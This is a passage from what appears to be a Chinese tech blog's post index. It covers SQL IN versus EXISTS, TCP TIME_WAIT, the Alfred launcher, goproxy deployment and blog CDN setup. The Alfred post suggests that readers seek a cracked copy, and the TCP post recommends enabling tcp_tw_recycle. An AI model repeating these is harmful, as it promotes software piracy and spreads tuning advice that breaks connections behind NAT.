Column(s) FROM table_name WHERE column IN (value1, value2, ... valueN);\nSELECT Column(s) FROM table_name WHERE column IN (SELECT Statement);\n```\n\n\n即可以用在子查询, 可以不用\n\n\n### 4.2 exist\n\n语法： EXISTS subquery\n参数：  subquery 是一个受限的 SELECT 语句 (不允许有 COMPUTE 子句和 INTO 关键字)。\n结果类型： Boolean 如果子查询包含行，则返回 TRUE ，否则返回 FLASE 。\n\n```sql\nSELECT \nc.CustomerId,c.CompanyName \nFROM \nCustomers c\nWHERE \nEXISTS(\nSELECT o.OrderID FROM Orders o WHERE o.CustomerID=c.CustomerID\n)\n```\n\n这里面的EXISTS是如何运作呢？子查询返回的是OrderId字段，可是外面的查询要找的是CustomerID和CompanyName字段，这两个字段肯定不在OrderID里面啊，这是如何匹配的呢？\n\nEXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False\n\n 如果EXISTS子句返回TRUE，这一行可作为外查询的结果行，否则不能作为结果。\n\n\n\n### 4.3 in vs exist\n\n**4.3.1 in 解析**\n\n```sql\nselect * from A  where id in(select id from B)\n```\n\n以上查询使用了in语句,in( )只执行一次**,它查出B表中的所有id字段并缓存起来**.\n\n之后,检查A表的id是否与B表中的id相等,如果相等则将A表的记录加入结果集中,直到遍历完A表的所有记录. 它的查询过程类似于以下过程:\n\n```java\nList resultSet=[];\nArray A=(select * from A);\nArray B=(select id from B);\nfor(int i=0;i<A.length;i++) {\n   for(int j=0;j<B.length;j++) {\n      if(A[i].id==B[j].id) {\n         resultSet.add(A[i]);\n         break;\n      }\n   }\n}\nreturn resultSet;\n```\n\n可以看出,当B表数据较大时不适合使用in( ),因为它会B表数据全部遍历一次.\n\n**4.3.2 exist 解析**\n\n```sql\nselect a.* from A a  where exists(select 1 from B b where a.id=b.id)\n```\n\n以上查询使用了exists语句,exists( )会执行A.length次,它并不缓存exists( )结果集\n\n因为exists( )结果集的内容并不重要,重要的是结果集中是否有记录,如果有则返回true,没有则返回false. 它的查询过程类似于以下过程\n\n```java\nList resultSet=[];\nArray A=(select * from A)\nfor(int i=0;i<A.length;i++) {\n   if(exists(A[i].id) {    //执行select 1 from B b where b.id=a.id是否有记录返回\n       resultSet.add(A[i]);\n   }\n}\nreturn resultSet;\n```\n\n\n当B表比A表数据大时适合使用exists( ),因为它没有那么遍历操作,只需要再执行一次查询就行.\n\n### 4.4 总结\n\n+  In可以与子查询一起使用,也可以直接in (a,b…..)。exist, not exist一般都是与子查询一起使用.\n\n+ 注意,一直以来认为exists比in效率高的说法是不准确的。\n\n  ```\n  in 与子查询一起使用的时候,只能针对主查询使用索引\n  not in则不会使用任何索引.\n  \n  exist会针对子查询的表使用索引. \n  not exist会对主子查询都会使用索引.\n  ```\n\n+ IN适合于外表大而内表小的情况；EXISTS适合于外表小而内表大的情况。\n\n+ 如果选择NOT IN  和 NOT EXISTS, 要注意 NOT IN 和 NULL 结合的问题。\n\n\n\n# 5. 查询注意点\n\n### 5.1 like 不要查前缀\n\n``` sql\nWHERE Field LIKE '%blah%'\n```\n\nThat causes a table/index scan, because the LIKE value begins with a wildcard character.\n\n### 5.2 字段不要用函数\n\n```sql\nWHERE FUNCTION(Field) = 'BLAH'\n```\n\nThe database server will have to evaluate FUNCTION() against every row in the table and then compare it to 'BLAH'.\n\n如果实在要用, 可以函数用在后面\n\n```sql\nWHERE Field = INVERSE_FUNCTION('BLAH')\n```\n\n\n\n### 5.3 BETWEEN vs <= and >=\n\n建议少使用BETWEEN, 因为不同的 sql 实现可能不一样\n\n+ between 的范围是包含两边的边界值\n  eg： id between 3 and 7 等价与 id >=3 and id<=7\n\n+ not between 的范围是不包含边界值\n  eg：id not between 3 and 7 等价与 id < 3 or id>7\n\n\n\n\n\n# 5. count(*), count(1) 的区别\n\n### 5.1 count(*), count(1), count(column)\n\n- COUNT(*) counts all rows\n- COUNT(column) counts non-NULLs only\n- [COUNT(1) is the same as COUNT(*)](https://stackoverflow.com/a/1221649/27535) because 1 is a non-null expressions\n\nYour use of COUNT(*) or COUNT(column) should be based on the desired output *only*.\n\n### 5.2 count(*), count(1)\n\nSame IO, same plan, the works\n\n\n\n# 6. 索引条件下推优化\n\n索引条件下推优化（Index Condition Pushdown (ICP) ）是MySQL5.6添加的，索引条件下推优化可以减少存储引擎查询基础表的次数，也可以减少MySQL服务器从存储引擎接收数据的次数。\n\n索引下推优化是默认开启的，可以通过下面的脚本控制开关。\n\n```sql\nSET optimizer_switch = 'index_condition_pushdown=off';  \nSET optimizer_switch = 'index_condition_pushdown=on';\n```\n\n在开始之前先先准备一张用户表(user)，其中主要几个字段有：id、name、age、address。建立联合索引（name，age）。\n\n```sql\nSELECT * from user where name like '刘%'\n```\n\n根据 \"最佳左前缀\" 的原则，这里使用了联合索引（name，age）进行了查询，性能要比全表扫描肯定要高。\n\n问题来了，如果有其他的条件呢？假设又有一个需求，要求匹配姓名第一个字为陈，年龄为20岁的用户，此时的sql语句如下：\n\n```sql\nSELECT * from user where name like '刘%' and age=20\n```\n\n5.6之前的版本是没有索引下推这个优化,  会忽略age这个字段，直接通过name进行查询，在(name,age)这课树上查找到了两个结果，然后拿着取到的id值一次次的回表查询，因此这个过程需要回表两次。\n\n5.6版本添加了索引下推这个优化, 并没有忽略age这个字段，而是在索引内部就判断了age是否等于20，对于不等于20的记录直接跳过，因此在(name,age)这棵索引树中只匹配到了一个记录，此时拿着这个id去主键索引树中回表查询全部数据，这个过程只需要回表一次。\n\n\n\n\n\n# 10. 参考资料:\n\n+ https://blog.csdn.net/shiyong1949/article/details/80923083\n+ https://www.journaldev.com/19165/sql-in-sql-not-in\n+ https://stackoverflow.com/questions/799584/what-makes-a-sql-statement-sargable\n+ https://stackoverflow.com/questions/173041/not-in-vs-not-exists\n+ https://www.polderknowledge.nl/2018/03/02/sql-beware-null-where-not/\n+ https://yefeihonours.github.io/post/mysql/in_and_exists/\n\n","tags":["sql"],"categories":["mysql"]},{"title":"tcp的TIME_WAIT和CLOSE_WAIT","url":"%2Fp%2F7b71ec65.html","content":"\nTIME_WAIT 是客户端（主动发起方）的状态，在发送第四次挥手后进入的一个状态。服务器也有可能出现TIME_WAIT，服务器也有可能是断开连接的主动发起方。\n\n进入TIME_WAIT后，客户端等待2MSL时间（RFC793建议是两分钟），在 Linux 上 2MSL 的时长是 60 秒，也会进入 CLOSED 状态。\n\n<!-- more -->\n\n# 1. TIME_WAIT\n\n### 1.1 作用\n\n那么客户端为什么进入 TIME_WAIT 而不是直接关闭？\n\n##### 1.  保证正确关闭\n\n**保证「被动关闭连接」的一方，能被正确的关闭**。\n\nTCP 协议在关闭连接的四次挥手中，在主动关闭方发送的最后一个 ACK 报文，有可能丢失，这时被动方会重新发 FIN 报文, 如果这时主动方处于 CLOSE 状态 ，就会响应 RST 报文而不是 ACK 报文。所以主动方要处于 TIME_WAIT 状态，而不能是 CLOSE。\n\n![img](tcp的TIME_WAIT和CLOSE_WAIT/168-timewait4.jpeg)\n\n1、在①中，CLient1端主动发起关闭链接，Server针对Client1的FIN回执了ACK包，然后接着发送了自己的FIN包，等待Client1回执最终的ACK包。\n\n2、在②中，这里假设TIME_WAIT的时间不足够充分，当Server还没有收到 ACK 消息时，Client1就主动变成CLOSED状态。\n\n3、在③中，由于Server一直没有等到自己FIN包的ACK应答包，导致一直处于LAST_ACK状态。\n\n4、在④中，因为 服务端因为没有收到 ACK 消息，当Client2重新与Server建立TCP链接，认为当前连接是合法的，CLient2重新发送 SYN 消息请求握手时会收到Server的 RST 消息，连接建立的过程就会被终止。\n\n##### 2. 防止相同四元组再次收到\n\n防止历史连接中的数据，被后面相同四元组的连接错误的接收。\n\nTCP 报文可能由于路由器异常而 “迷路”，在迷途期间，TCP 发送端可能因确认超时而重发这个报文，迷途的报文在路由器修复后也会被送到最终目的地，这个原来的迷途报文就称为 lost duplicate。在关闭一个 TCP 连接后，马上又重新建立起一个相同的 IP 地址和端口之间的 TCP 连接，后一个连接被称为前一个连接的化身，那么有可能出现这种情况，前一个连接的迷途重复报文在前一个连接终止后出现，从而被误解成从属于新的化身。\n\n为了避免这个情 况， TIME_WAIT 状态需要持续 2MSL，因为这样就可以保证当成功建立一个 TCP 连接的时候，来自连接先前化身的重复报文已经在网络中消逝。\n\n### 1.2 过多的原因\n\n如果服务端出现大量的 TIME_WAIT 状态的 TCP 连接，就是说明服务端主动断开了很多 TCP 连接。问题来了，什么场景下服务端会主动断开连接呢？\n\n第一个场景：HTTP 没有使用长连接\n第二个场景：HTTP 长连接超时\n第三个场景：HTTP 长连接的请求数量达到上限\n\n##### 1. HTTP 没有使用长连接\n\n从 HTTP/1.1 开始， 就默认是开启了 Keep-Alive，现在大多数浏览器都默认是使用 HTTP/1.1，所以 Keep-Alive 都是默认打开的。一旦客户端和服务端达成协议，那么长连接就建立好了。\n\n\n\n**客户端禁用了 HTTP Keep-Alive，服务端开启 HTTP Keep-Alive，谁是主动关闭方？**\n\n当客户端禁用了 HTTP Keep-Alive，这时候 HTTP 请求的 header 就会有 `Connection:close` 信息，这时服务端在发完 HTTP 响应后，就会主动关闭连接。不再重用这个连接的时机就只有在服务端了。\n\n\n\n**客户端开启了 HTTP Keep-Alive，服务端禁用了 HTTP Keep-Alive，谁是主动关闭方？**\n\n当客户端开启了 HTTP Keep-Alive，而服务端禁用了 HTTP Keep-Alive，这时服务端在发完 HTTP 响应后，服务端也会主动关闭连接。\n\n当服务端出现大量的 TIME_WAIT 状态连接的时候，可以排查下是否客户端和服务端都开启了 HTTP Keep-Alive。\n\n\n\n##### 2. HTTP 长连接超时\n\n假设设置了 HTTP 长连接的超时时间是 60 秒，nginx 就会启动一个「定时器」，如果客户端在完后一个 HTTP 请求后，在 60 秒内都没有再发起新的请求，定时器的时间一到，nginx 就会触发回调函数来关闭该连接，那么此时服务端上就会出现 TIME_WAIT 状态的连接。\n\n当服务端出现大量 TIME_WAIT 状态的连接时，如果现象是有大量的客户端建立完 TCP 连接后，很长一段时间没有发送数据，那么大概率就是因为 HTTP 长连接超时，导致服务端主动关闭连接，产生大量处于 TIME_WAIT 状态的连接。\n\n可以往网络问题的方向排查，比如是否是因为网络问题，导致客户端发送的数据一直没有被服务端接收到，以至于 HTTP 长连接超时。\n\n##### 3. HTTP 长连接的请求数量达到上限\n\nWeb 服务端通常会有个参数，来定义一条 HTTP 长连接上最大能处理的请求数量，当超过最大限制时，就会主动关闭连接。\n\n比如 nginx 的 keepalive_requests 这个参数，这个参数是指一个 HTTP 长连接建立之后，nginx 就会为这个连接设置一个计数器，记录这个 HTTP 长连接上已经接收并处理的客户端请求的数量。如果达到这个参数设置的最大值时，则 nginx 会主动关闭这个长连接，那么此时服务端上就会出现 TIME_WAIT 状态的连接。\n\nkeepalive_requests 参数的默认值是 100 ，意味着每个 HTTP 长连接最多只能跑 100 次请求，这个参数往往被大多数人忽略，因为当 QPS (每秒请求数) 不是很高时，默认值 100 凑合够用。\n\n但是，对于一些 QPS 比较高的场景，比如超过 10000 QPS，甚至达到 30000 , 50000 甚至更高，如果 keepalive_requests 参数值是 100，这时候就 nginx 就会很频繁地关闭连接，那么此时服务端上就会出大量的 TIME_WAIT 状态。\n\n针对这个场景下，解决的方式也很简单，调大 nginx 的 keepalive_requests 参数就行。\n\n### 1.3 危害\n\n过多的 TIME-WAIT 状态主要的危害有两种：\n\n- 第一是占用系统资源，比如文件描述符、内存资源、CPU 资源等；\n- 第二是占用端口资源，端口资源也是有限的，一般可以开启的端口为 `32768～61000`，也可以通过 `net.ipv4.ip_local_port_range`参数指定范围。\n\n\n\n### 1.4 优化\n\nTIME_WAIT 是我们的朋友，它是有助于我们的，不要试图避免这个状态，而是应该弄清楚它。\n\n如果服务端要避免过多的 TIME_WAIT 状态的连接，就永远不要主动断开连接，让客户端去断开，由分布在各处的客户端去承受 TIME_WAIT。\n\n打开 sysctl.conf 文件，修改以下几个参数：\n\n```bash\nnet.ipv4.tcp_tw_recycle = 1\t #表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭\nnet.ipv4.tcp_tw_reuse = 1      # 重新使用TIME_WAIT状态的连接。\nnet.ipv4.tcp_timestamps = 1     # 需要打开对 TCP 时间戳的支持。\n```\n\n\n\n# 2. CLOSE_WAIT\n\nCLOSE_WAIT 状态是「被动关闭方」才会有的状态，而且如果「被动关闭方」没有调用 close 函数关闭连接，那么就无法发出 FIN 报文，从而无法使得 CLOSE_WAIT 状态的连接转变为 LAST_ACK 状态。\n\n所以，当服务端出现大量 CLOSE_WAIT 状态的连接的时候，说明服务端的程序没有调用 close 函数关闭连接。\n\n当服务端出现大量 CLOSE_WAIT 状态的连接的时候，通常都是代码的问题，这时候我们需要针对具体的代码一步一步的进行排查和定位，主要分析的方向就是服务端为什么没有调用 close。\n\n# 3. 头脑风暴\n\n+  避免提前close，服务器收不到重发。防止迷途报文重发到相同四元组。\n\n+ 服务器过多原因，肯定是服务器主动关的。确认http keepalive使用，超时，数量限制。可以调整linux参数不建议。\n  \n     \n\n# 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/591724475\n","tags":["tcp"],"categories":["网络"]},{"title":"mac效率神器alfred的使用","url":"%2Fp%2F4fc3a301.html","content":"\nalfred，mac效率排名第一的软件。 我常用的是 Search + Clipboard + Snippets 和各种workflow。\n\n<!-- more -->\n\n# 1. 使用\n\n### 1.1 安装\n\n+ 建议购买正版，没钱的可以找找破解版。\n\n+ 设定->键盘->快捷键->聚焦->去掉快捷键，Spotlight快捷。（一山不容二虎）\n\n### 1.2 技巧\n\n+ 我们可以使用`‘（单引号）`或者`Space（空格键）`快速启用打开文件或者文件夹，功能类似于使用`Open + 关键字`。\n+ 输入 `=` 来调用系统的计算器，来输入复杂的计算，支持许多高级的数学函数。\n+ Alfred一个很重要的命令操作就是：`↑`，可以调用上次的历史命令！\n\n\n\n# 2. 配置\n\n### 2.1  General\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162140096.png\" alt=\"image-20220108162140096\" style=\"zoom: 40%;\" />\n\n我个人设置的 Alfred 的呼出快捷键为双击Command键。这样设置不仅呼出速度非常快，而且可以避开和其它应用的呼出快捷键冲突。\n\n### 2.2 Default Results\n\n在没有结果的时候，我设置的谷歌和百度搜索。\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162242175.png\" alt=\"image-20220108162242175\" style=\"zoom: 30%;\" />\n\n\n\n### 2.3 Web Search\n\n增加了一个百度。\n\n```bash\nhttp://www.baidu.com/s?wd={query}\n\n百度一下 {query}\n```\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162717520.png\" alt=\"image-20220108162717520\" style=\"zoom: 50%;\" />\n\n### 2.4 Web Bookmarks\n\n打开谷歌浏览器书签即可。\n\n\n\n### 2.5 Clipboard History\n\n粘贴板神器，无需重复购买 Paste 等剪贴板管理工具。我用的 `option + v` 快捷键。\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162857847.png\" alt=\"image-20220108162857847\" style=\"zoom:35%;\" />\n\n### 2.6 Snipptes\n\n神器，输入关键词替换一段文字。例如我配置的 `\\20`可以快速替换成  \"2006-01-02 15:04:05\"\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108163211720.png\" alt=\"image-20220108163211720\" style=\"zoom:35%;\" />\n\n### 2.7 Advanced\n\n强烈建议dropbox同步自己的配置。Alfred官方及我个人都不推荐使用iCloud\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108163818212.png\" alt=\"image-20220108163818212\" style=\"zoom: 33%;\" />\n\n\n\n# 3. 常用workflow\n\n### 3.1 推荐插件\n\nhttps://github.com/zenorocha/alfred-workflows\n\n### 3.2 时间戳转换\n\n https://github.com/work-helper/time-format-alfred\n\n### 3.3 打开jetbrains不同项目 \n\nhttps://github.com/bchatard/alfred-jetbrains\n\n### 3.4 设置程序变量名字\n\nhttps://github.com/xudaolong/CodeVar\n\n\n\n# 4. 使用总结\n\nSince Jan 21, 2022, Alfred has been used 1,012 times. Average 2.5 times per day.\n\n+ workflow   时间戳\n+ snippets\n\n\n\n# 5. 参考资料\n\n+ https://github.com/zenorocha/alfred-workflows\n+ http://www.packal.org/  常用扩展\n\n","tags":["alfred"],"categories":["软件"]},{"title":"mac批量整理照片或文件","url":"%2Fp%2Ff4cf3f3.html","content":"\n平常照片太多了，并且散落在各个地方，并且还有很多重复的和类型的照片，每次整理后都累的半死，有新的照片后就又打乱了以前的空间。\n\n所以这次特意找了工具辅助人类整理。mac下有一个非常强悍的利器 hazel，但是学习成本有点高，用过都说好。\n\n为了每一步可控，把整理分成了多步操作，并且每一步都用了不同的软件。\n\n<!-- more -->\n\n# 1. 先归类文件（Folder Tidy）\n\n先把所有文件扔到一个大文件夹里。根据文件类型，先整理成不同的文件夹。该工具有一个优势是可以Undo。\n![image-20211210230508069](mac%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%85%A7%E7%89%87%E6%88%96%E6%96%87%E4%BB%B6/image-20211210230508069.png)\n\n# 2. 查找重复和相似文件（Duplicate File Finder Pro）\n上万个文件，也是分分钟查找完毕。然后删除重复文件不要太爽。\n![image-20211210230620263](mac%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%85%A7%E7%89%87%E6%88%96%E6%96%87%E4%BB%B6/image-20211210230620263.png)\n\n# 3. 批量修改名字（A Better Finder Rename）\n\n例如可以根据日期批量重命名后，就可以快速再次归类文件了。\n![image-20211210230710217](mac%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%85%A7%E7%89%87%E6%88%96%E6%96%87%E4%BB%B6/image-20211210230710217.png)\n\n\n# 4. 参考资料\n\n+ https://www.v2ex.com/t/670128\n","tags":["mac"],"categories":["软件"]},{"title":"goproxy的部署实践","url":"%2Fp%2F74b41bb2.html","content":"\n# 0. 前言\n\n在大陆地区我们无法直接通过 `go get` 命令获取到一些第三方包，最常见的就是 `golang.org/x` 下面的各种优秀的包. 解决方案如下:\n\n```bash\n# go.1.12.x\nexport GO111MODULE=on\nexport GOPROXY=https://goproxy.cn\n\n# go1.13.x\ngo env -w GOPROXY=https://goproxy.cn,direct\ngo env -w GOPRIVATE=*.corp.example.com \n\n#GOPRIVATE=*.corp.example.com 表示所有模块路径以 corp.example.com 的下一级域名 (如 team1.corp.example.com) 为前缀的模块版本都将不经过 Go module proxy 和 Go checksum database，需要注意的是不包括 corp.example.com 本身。\n```\n\n<!-- more -->\n\n\n\n本文将重点介绍 go module 的 proxy 配置实现，包括如下两种的代理配置：\n\n- GOPROXY\n- Athens\n\n# 1.  goproxy\n\nhttps://github.com/goproxyio/goproxy\n\n### 1.1 安装go\n\n```bash\nwget https://dl.google.com/go/go1.13.4.linux-amd64.tar.gz #下载go\nsudo tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz # 解压到/usr/local\nexport PATH=$PATH:/usr/local/go/bin # 设置环境变量\ngo version # go version go1.13.4 linux/amd64\n```\n\n### 1.2 安装goproxy\n\n```bash\ngit clone https://github.com/goproxyio/goproxy.git\ncd goproxy/\nmake\n```\n\n### 1.3 代理\n\n```bash\n# 服务端执行\n./bin/goproxy -cacheDir=/tmp/test -listen=0.0.0.0:8082 \n\n\n# 客户端操作\nGOPROXY=http://服务端ip:8082 go get -v github.com/spf13/cobra # 会缓存在服务端/tmp/test目录下\n```\n\n### 1.4 nginx配置\n\n```nginx\n./bin/goproxy -cacheDir=/tmp/test -listen :8082 -proxy https://goproxy.cn -exclude liuvv.com\n\n\nserver {\n    server_name goproxy.liuvv.com;\n    listen 80 ;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/goproxy_access_log;\n    error_log /var/log/nginx/goproxy_error_log notice;\n\n    location  / {\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_connect_timeout 300s;\n        proxy_send_timeout 300s;\n        proxy_read_timeout 300s;\n\n        proxy_pass             http://127.0.0.1:8082;\n    }\n}\n```\n\n# 2.  Athens\n\n+ https://github.com/gomods/athens\n\n```bash\ngit clone https://github.com/gomods/athens \ncd athens \n\nmake build-ver VERSION=\"0.7.0\" # 如果下载不下来, 修改makefile的goproxy\n./athens -version\n```\n\n+ 服务器启动\n\n```bash\nexport ATHENS_STORAGE_TYPE=disk  # 缓存到硬盘\nexport ATHENS_DISK_STORAGE_ROOT=~/athens-storage\n./athens\n```\n\n+ 客户端测试\n\n```bash\nexport GO111MODULE=on export GOPROXY=http:#服务器ip:3000\n\n\ngit clone https://github.com/athens-artifacts/walkthrough.git \ncd walkthrough\ngo run .  # 会缓存在服务端~/athens-storage目录下\n\n\ncurl 服务器ip:3000/github.com/athens-artifacts/samplelib/@v/list\n```\n\n# 3. 参考资料\n\n+ [Hello，Go module proxy](https://tonybai.com/2018/11/26/hello-go-module-proxy/)\n+ [Go Module Proxy](https://juejin.im/post/5c8f9f8ef265da612c3a34b9)\n+ https://blog.wolfogre.com/posts/golang-package-history/\n+ https://juejin.im/post/5d8ee2db6fb9a04e0b0d9c8b\n+ https://github.com/goproxy/goproxy.cn/","tags":["golang"],"categories":["3_golang杂项"]},{"title":"加速博客访问速度","url":"%2Fp%2F5ee5b7c.html","content":"\n\n\n不只一个人说过，我博客访问的速度真慢。 博客虽然只是记录个人学习历程的地方，但也要记得优化访问速度。 \n\n今天终于有时间折腾下，让网站在国内和国外各备份一份，然后国内的用户访问国内的coding，国外的用户访问国外的github。 \n\n<!-- more -->\n\n# 1. 国内外分流\n\n+ 登录网站, https://wwww.coding.net/, 注册登录\n\n+ 创建项目时候选择DevOps项目, 此处用的自己的用户名`levonfly`, 仓库地址为`git@e.coding.net:levonfly/levonfly.git`\n\n+ 在个人设置里, 配置公钥\n\n+ `ssh -T git@e.coding.net -i ~/.ssh/github-unix2dos`  测试密钥是否能访问\n\n+ 修hexo配置文件\n\n  ```yaml\n  deploy:\n      -\n       type: git\n       repo:\n          github: git@unix2dos:unix2dos/unix2dos.github.io.git # github地址\n          coding: git@e.coding.net:levonfly/levonfly.git #coding地址\n       branch: master\n  ```\n\n+ 修改ssh配置文件\n\n  ```yaml\n  Host coding e.coding.net\n  \tHostName e.coding.net\n  \tIdentityFile ~/.ssh/github-unix2dos # 自己的私钥\n  \tUser levonfly\n  ```\n\n+ 个人设置->实名认证\n\n+ 项目->持续部署->静态网站->发布网站->立即部署\n\n+ DNS解析 \n\n  CNAME->默认指向coding-pages.com\n\n  CNMA->境外指向github.io\n\n  我的域名`liuvv.com`解析如下\n\n  ```bash\n  主机 类型\t 线路\t 记录值\n  www\tCNAME\t境外\tunix2dos.github.io\n  www\tCNAME\t默认\tr8ea0k.coding-pages.com\n  ```\n\n  \n\n+ 证书申请失败\n\n  申请错误原因是：在验证域名所有权时会定位到 Github Pages 的主机上导致 SSL 证书申请失败\n\n  正确的做法是：先去域名 DNS 把 GitHub 的解析暂停掉，然后再重新申请 SSL 证书，大约十秒左右就能申请成功，然后开启强制 HTTPS 访问\n\n  \n\n+ 测试\n\n  ```bash\n  host www.liuvv.com   # 国内测试\n  www.liuvv.com is an alias for r8ea0k.coding-pages.com.\n  r8ea0k.coding-pages.com has address 150.109.4.162\n  r8ea0k.coding-pages.com has address 119.28.218.218\n  \n  \n  host www.liuvv.com  # 国外服务器测试\n  www.liuvv.com is an alias for unix2dos.github.io.\n  unix2dos.github.io has address 185.199.109.153\n  unix2dos.github.io has address 185.199.111.153\n  unix2dos.github.io has address 185.199.108.153\n  unix2dos.github.io has address 185.199.110.153\n  ```\n\n  \n\n  另外可开启和关闭vpn, 刷新博客, 看证书的有效期也能看到区别, 国内外访问同一个地址, 实现了分流. 至此加速大功告成.\n\n\n\n# 2. hexo优化方案\n\n###  2.1 主题源加载优化\n\n把在NexT主题的_config.yml里面的：\n\n```dart\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default)\nhost:\n```\n\n改为：\n\n```dart\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default)\nhost: //fonts.lug.ustc.edu.cn\n```\n\n因为`fonts.lug.ustc.edu.cn`是中科大的源，相比之前能快一下\n\n### 2.2 压缩页面\n\n```bash\nnpm install hexo-neat --save\n```\n\n配置文件\n\n```yml\nneat_enable: true\nneat_html:\n  enable: true\n  exclude:\n    - '**/baidu*.html'\n    - '**/google*.html'\nneat_css:\n  enable: true\n  exclude:\n    - '**/*.min.css'\nneat_js:\n  enable: true\n  mangle: true\n  output:\n  compress:\n  exclude:\n    - '**/*.min.js'\n    - '**/jquery.fancybox.pack.js'\n    - '**/index.js'\n```\n\n\n\n### 2.3 懒加载(暂时关闭)\n\nhttps://github.com/theme-next/theme-next-jquery-lazyload\n\n此处会造成持久链接本地图片不显示, 未解决.\n\n```bash\ncd themes/next\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n#Enable module in NexT _config.yml file:\nlazyload: true\n```\n\n\n\n### 2.4 图片压缩\n\nhttps://imageoptim.com/mac\n\n导航到你的markdown索引的图片文件夹，并把里面的图片直接拖入 ImageOptim 就好了，同时压缩完会直接替换，直接commit新的优化的图片即可，原文件会被拉入垃圾箱(mac 的垃圾箱)可恢复，压缩可以在 ImageOptim 的 Preference 里面进行更大的压缩比设置.\n\n\n\n# 3. cdn加速\n\n### 3.1 静态资源放在 cdn 上\n\n还有一种方案是把生成的静态文件放在国内的CDN上, 来进行加速\n\n可参考: https://github.com/saltbo/uptoc\n\n### 3.2 hexo-cdn加速\n\n##### 1 Typora配置\n\n图片直接 `Ctrl + v` 即可粘贴拷贝到指定目录并实时预览。\n\n![image-20201127234658946](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201127234658946.png)\n\n\n\n##### 2 COS配置\n\n+ 创建桶, 公有读私有写\n\n  ![image-20201128023712579](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128023712579.png)\n\n+ 开启静态网站\n\n  进入桶详情，点击基础配置->静态网站，开启静态网站，索引`index.html`, 强制 https, 注意此时是默认的域名.\n\n  ![image-20201128023839242](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128023839242.png)\n\n+ 自定义 CDN 加速域名\n\n  进入桶详情，点击域名与传输管理->自定义 CDN 加速域名\n\n  ![image-20201128024033430](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024033430.png)\n\n  在域名处填写你要设置的自定义域名，在源站类型处选择**静态网站源站**，复制CNAME的内容，设置域名解析\n\n  ![image-20201128024052385](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024052385.png)\n\n+ 证书配置\n\n  进入SSL 证书管理->证书管理->申请免费证书->免费申请一年的\n\n  ![image-20201128024600259](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024600259.png)\n\n  进入内容分发网络->证书管理->配置证书\n\n  ![image-20201128024410397](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024410397.png)\n\n+ 域名管理\n\n  进入内容分发网络->域名管理\n\n  ![image-20201128024743954](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024743954.png)\n\n  https 配置内选项都打开, 例如强制 https\n\n  ![image-20201128024849838](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024849838.png)\n\n  源站信息配置, 指向静态网站的地址\n\n  ![image-20201128024940139](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024940139.png)\n\n  \n\n+ 流量限制\n\n  进入内容分发网络->域名管理->高级配置\n\n  ![image-20201128033716089](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128033716089.png)\n\n  进入内容分发网络->域名管理->访问控制\n\n  ![image-20201128033835738](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128033835738.png)\n\n##### 3 配置插件\n\n```bash\nnpm install hexo-deployer-cos-cdn --save\n\ndeploy:\n    -\n     type: git\n     repo:\n        github: git@unix2dos:unix2dos/unix2dos.github.io.git\n        coding: git@e.coding.net:levonfly/levonfly.git\n     branch: master\n    -\n     type: cos-cdn\n     cloud: tencent\n     bucket: blog-1300740185\n     region: ap-beijing\n     secretId: x\n     secretKey:  x\n```\n\nhexo, _config.yml 设置 url 为 